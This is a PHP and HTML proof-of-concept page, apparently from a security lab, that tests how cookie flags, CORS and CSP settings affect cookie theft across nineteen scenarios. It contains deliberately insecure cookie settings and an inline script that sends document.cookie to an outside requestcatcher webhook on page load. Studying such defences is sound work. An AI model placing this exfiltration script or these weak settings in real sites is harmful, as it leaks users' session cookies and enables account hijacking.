<?php
	// Cookie configuration
	$cookie_path = '/';
	$cookie_domain = $_SERVER['HTTP_HOST'];
	$cookie_secure = false;
	$cookie_httponly = false;
	$cookie_samesite = 'lax';
	
	// Header configuration
	$enable_cors = false;
	$cors_configuration = "Access-Control-Allow-Methods: POST";
	$enable_csp = false;
	$csp_configuration = "Content-Security-Policy: script-src 'unsafe-inline' 172.17.0.3;";
	
	// Webhook for HTTP Request
	$http_url = "https://3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com/test";
	

	/**
	 * Setup cookie
	 */
	session_set_cookie_params([
		'lifetime' => time() + 86400,
    		'path' => $cookie_path,
   		'domain' => $cookie_domain,
  		'secure' => $cookie_secure,
		'httponly' => $cookie_httponly,
		'samesite' => $cookie_samesite
	]);
	session_start();


	// Set the CORS headers
	if ($enable_cors === true) {
		cors($cors_configuration);
	}
	
	/**
	 * Configure the CORS headers.
	 *
	 * An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any origin.
	 *
	 * In a production environment, you probably want to be more restrictive, but this gives you the general idea of what is involved.  For the nitty-gritty low-down, read:
	 * - https://developer.mozilla.org/en-US/search?q=HTTP%20access%20control
	 * - https://fetch.spec.whatwg.org/#http-cors-protocol
	 */
	function cors($cors_conf) {
		header($cors_conf);

		//header("Access-Control-Allow-Origin: *");
		//header('Access-Control-Allow-Credentials: true');
		//header('Access-Control-Max-Age: 86400');    // cache for 1 day
		//header("Access-Control-Allow-Methods: POST");
		//header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");
	}
	
	// Set CSP headers
	if ($enable_csp === true) {
		csp($csp_configuration);
	}
	
	/**
	 * Configure CSP headers
	 *
	 * For the POC: Allow script tag bodies and javascript: URIs, allow scripts from 172.17.0.3
	 * Header Set Content-Security-Policy "script-src 'unsafe-inline' 172.17.0.3;"

	 * Allow everything but only from the same origin
	 * Header Set Content-Security-Policy "default-src 'self'"

	 * Only Allow Scripts from the same origin
	 * Header Set Content-Security-Policy "script-src" 'self';"

	 * Starter Policy: This policy allows images, scripts, AJAX, form actions, and CSS from the same origin, and does not allow any other resources to load (eg object, frame, media, etc). It is a good starting point for many 	sites.
	 * Header Set Content-Security-Policy "default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; base-uri 'self'; form-action 'self'"
	 *
	 * Sources: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
	 */
	function csp($csp_conf) {
		header($csp_conf);
		
		//header("Content-Security-Policy: script-src 'unsafe-inline' 172.17.0.3;");
	}
	
	
	//http_request($http_url, session_id());
	/**
	 * 
	 */
	function http_request($url, $cookie) {
		$headers = array(
			'Test: HTTP_REQUEST',
			'Cookie: ' .$cookie
		);

		$context = stream_context_create([
			'http' => [
				'header' => $headers
			]
		]);

		$response = file_get_contents($url, false, $context);
	}
	
?>

<!doctype html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
		<title>POC for headers & Cookie configuration</title>
		<script type="text/javascript" src="http://172.17.0.3/gotcha.js"></script> 
	</head>
	<body>
		<h1>Cookie setting, CSP & CORS</h1>
		<h1>Proof of Concept</h1>
		
		<h2>Scenario 1 - Local JavaScript - No protection</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
		</ul> 
		<p>Cookie is sent to the Webhook in http & https.</p>


		<h2>Scenario 2 - Local JavaScript - HttpOnly=true</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul> 
		<p>Cookie is not sent to the Webhook in http & https.</p>


		<h2>Scenario 3 - Local JavaScript - Secure=true</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=true</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
		</ul> 
		<p>Browser raises the error: "Cookie 'PHPSESSID' has been rejected because a non-HTTPS cookie can’t be set as 'secure'.".</p>
		<p>Cookie is not sent to the Webhook in http & https.</p>


		<h2>Scenario 4 - Local JavaScript - Set CORS</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Access-Control-Allow-Methods: POST</li>
		</ul> 
		<p>Cookie is sent to the Webhook in http & https even with GET HTTP method.</p>


		<h2>Scenario 5 - External JavaScript - No protection</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is sent by the external Javascript to the Webhook in http & https.</p>
		
		
		<h2>Scenario 6 - External JavaScript - SameSite=Strict</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=Strict</li>
		</ul>
		<p>Cookie is sent by the external Javascript to the Webhook even with strict samesite.</p>
		
		
		<h2>Scenario 7 - JavaScript - CSP: Allow everything but only from the same origin</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Content-Security-Policy: default-src 'self'</li>
		</ul>
		<p>Cookie is not sent. Inline & external JavaScript load are blocked.</p>
		

		<h2>Scenario 8 - JavaScript - CSP: Allow all inline >script< elements</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Content-Security-Policy: script-src 'unsafe-inline'</li>
		</ul>
		<p>Cookie is sent only by the local Javascript to the Webhook.</p>
		

		<h2>Scenario 9 - JavaScript - CSP: Allow all inline >script< elements & specific origin</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
			<li>Content-Security-Policy: script-src 'unsafe-inline' 172.17.0.3</li>
		</ul>
		<p>Cookie is sent by the local & external Javascript to the Webhook.</p>
		

		<h2>Scenario 10 - HTTP Request - HttpOnly=true</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is only sent to the Webhook via HTTP request.</p>		


		<h2>Scenario 11 - HTTP Request - External link - HttpOnly=true</h2>
		<a href="https://3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com/test">Link to the Webhook</a>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is not forwarded to exteral link.</p>		
		

		<h2>Scenario 12 - HTTP Request - Internal link - No Protection</h2>
		<a href="http://172.17.0.2/read_cookie.php">Internal link to read_cookie.php</a>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=false</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is accessible on read_cookie.php.</p>
		<p>Cookie is sent by the local & external Javascript to the Webhook.</p>
		
		
		<h2>Scenario 13 - HTTP Request - Internal link - HttpOnly=true - path=header_mgt.php</h2>
		<a href="http://172.17.0.2/read_cookie.php">Internal link to read_cookie.php</a>
		<ul>
			<li>path=/read_cookie.php</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is not accessible on read_cookie.php.</p>
		<p>Cookie is not sent by the local & external Javascript to the Webhook.</p>
		
		
		<h2>Scenario 14 - HTTP Request - Form - HttpOnly=true - samesite=none</h2>
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is accessible on read_cookie.php.</p>

		
		<h2>Scenario 15 - HTTP Request - CSRF - HttpOnly=true - samesite=none</h2>
		Go to http://172.17.0.3/csrf_01.html
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=None</li>
		</ul>
		<p>Cookie is accessible on read_cookie.php.</p>


		<h2>Scenario 16 - HTTP Request - CSRF - HttpOnly=true - samesite=Strict</h2>
		Go to http://172.17.0.3/csrf_01.html
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=Strict</li>
		</ul>
		<p>Cookie is not accessible on read_cookie.php.</p>
		
		
		<h2>Scenario 17 - HTTP Request - External redirect - samesite=none</h2>
		Go to http://172.17.0.3/external_redirect.php
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=none</li>
		</ul>
		<p>Cookie is accessible on read_cookie.php.</p>
		
		
		<h2>Scenario 18 - HTTP Request - External redirect - samesite=Strict</h2>
		Go to http://172.17.0.3/external_redirect.php
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=Strict</li>
		</ul>
		<p>Cookie is not accessible on read_cookie.php.</p>


		<h2>Scenario 19 - HTTP Request - External redirect - samesite=Lax</h2>
		Go to http://172.17.0.3/external_redirect.php
		<ul>
			<li>path=/</li>
			<li>Secure=false</li>
			<li>HttpOnly=true</li>
			<li>SameSite=Lax</li>
		</ul>
		<p>Cookie is accessible on read_cookie.php.</p>

		
		<h2>Form</h2>
		<form action="read_cookie.php" method="post">
			Name: <input type="text" name="name"><br>
			E-mail: <input type="text" name="email"><br>
			<input type="submit">
		</form>


		<!-- Script to exfiltrate cookie to Webhook -->
		<script>
			function sendMessage() {
				var webhook_url = "3ceaad7a-8dde-49e1-8b18-550cbe9fbc34.requestcatcher.com";
				
				var request_https = new XMLHttpRequest();
				request_https.open("GET", "https://"+webhook_url+"/test?script=local&"+document.cookie);
				request_https.send();
				
				var request_http = new XMLHttpRequest();
				request_http.open("GET", "http://"+webhook_url+"/test?script=local&"+document.cookie);
				request_http.send();	
			}
		    	sendMessage()
		    	
		    	<!--window.location.href = "https://"+webhook_url+"/test";-->
		</script>
	</body>
</html>